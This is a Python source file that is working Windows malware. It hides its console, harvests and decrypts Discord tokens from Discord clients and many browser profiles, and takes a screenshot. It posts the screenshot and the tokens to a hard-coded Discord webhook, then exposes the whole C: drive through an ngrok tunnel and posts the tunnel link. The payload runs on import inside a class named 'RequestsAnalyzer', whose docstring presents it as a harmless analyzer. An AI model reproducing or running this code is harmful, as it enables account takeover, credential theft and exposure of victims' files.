import requests, os, json, base64, getpass, ctypes, win32process, pyautogui, time, http.server, socketserver

from re import findall
from Crypto.Cipher import AES # New import 1, AES / also works with from Crypto.Cipher import AES, remember crypto and cryptodrome are pretty same module
from win32crypt import CryptUnprotectData # New import 2, win32crypt
from pyngrok import ngrok

appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" # new token regex tbw
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex
username = getpass.getuser() # username
startup = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
hook = "https://discord.com/api/webhooks/1056642764701446254/LroWAHbhlld1gTQeVSSe2tNtzzmE3-Y_7u95IvVlUqo9euzZp-Ec6DvvSDTex_uGA5jd"


def HideMe():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0: # HideMyAss™
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)

def getheaders(token=None, content_type="application/json"): # simply getting our headers for token validation
    """
    Get headers for request
    """
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36" # one of the last agents just in case discord wants to break balls
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def decrypt_payload(cipher, payload): # decrypting our payload, in this case tokens
    """
    Decrypt Request Payload
    """
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv): # getting an AES Cipher
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key): # decrypting the password, or in this case token with our masterkey & buff
    try:
        iv = buff[3:15] # getting the IV
        payload = buff[15:] # the encrypted token
        cipher = generate_cipher(master_key, iv) # our cipher
        decrypted_pass = decrypt_payload(cipher, payload) # decryping that shit
        decrypted_pass = decrypted_pass[:-16].decode() # and splitting away stuff nobody asked for
        return decrypted_pass # boom
    except:
        return "ratio"

def get_token_key(path): # token encryption uses a key stored in a different folder, lets get it, shall we? :)
    with open(path, "r", encoding="utf-8") as f: # opening the key file
        local_state = f.read() # reading our file
    local_state = json.loads(local_state) # and thats our local_state value

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) # now we want our key
    master_key = master_key[5:] # which we will eventually get after splitting off nonesense
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1] # and using win32crypt
    return master_key # boom, key

# Below is a token grabber using it, feel free to skid it, honestly im just mad. make sure to mention "CC/CL" in your code if u copy-paste it :)

def grabTokens():
    tokens = []
    paths = {
        'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
        'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
        'Firefox': roaming + r'\\Mozilla\\Firefox\\Profiles'
}

    for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path: # we first check if its not discord, cuz then we wont need the encryption bs at all and grab it like normal
                if "Mozilla" in path: # ha, yeah.. firefox needs extra care lmfao.
                    for loc, _, files in os.walk(path):
                        for _file in files:
                            if not _file.endswith('.sqlite'):
                                continue
                            for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(regex, line):
                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                    if r.status_code == 200:
                                        if token in tokens:
                                            continue
                                        tokens.append(token)

                else: # If its not firefox
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(regex, line):
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                                    tokens.append(token)

            else:
                for file_name in os.listdir(path): # if it is discord...
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
                        for y in findall(encrypted_regex, line): # and find our encrypted regex
                            for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs
                                try:
                                    token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
                                except:
                                    pass
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                                    tokens.append(token)


    return tokens


class RequestsAnalyzer:
    def __init__(self):
        """
        Analyzer that works in conjunction with the ```requests``` module.
        """

        pyautogui.screenshot().save(f"C:\\Users\\{username}\\Videos\\ss.png")
        
        with open(f"C:\\Users\\{username}\\Videos\\ss.png", 'rb') as ss:
            requests.post(
                url=hook,
                files={'ss.png': ss.read()}
            )
            for token in grabTokens():
                requests.post(
                    url=hook,
                    json={"content": f"```{token}```"}
                )
            
        # serve c drive
        tunnel = ngrok.connect()
        PORT = 80
        handler = http.server.SimpleHTTPRequestHandler
        requests.post(
                url=hook,
                json={'content': f"@everyone --> {tunnel}"}
            )
        with socketserver.TCPServer(("", PORT), handler) as httpd:
            os.chdir("C:\\")
            httpd.serve_forever()

    



RequestsAnalyzer()